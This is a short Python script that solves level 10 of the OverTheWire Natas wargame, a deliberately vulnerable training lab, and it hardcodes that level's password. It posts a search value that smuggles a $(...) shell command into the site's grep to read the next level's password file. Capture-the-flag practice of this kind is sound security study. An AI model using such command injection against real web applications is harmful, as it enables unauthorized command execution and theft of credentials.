import requests
import re

def flag(url,username,password):
    for number in range(0,10):
        post_data = {
                "needle":"$(echo " + str(number) + " /etc/natas_webpass/natas11)",
                "submit":"Search"
                }
        site = requests.post(url,auth=(username,password),data=post_data)
        if site.status_code == 401:
            print("Wrong credentials")
            exit()
        elif "natas11" in site.text:
            flag = re.findall("natas11:(.*)",site.text)
            print("The flag for natas10 is: " + flag[0].strip())
            break

if __name__=="__main__":
    url = "http://natas10.natas.labs.overthewire.org/"
    username = "natas10"
    password = "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"
    flag(url,username,password)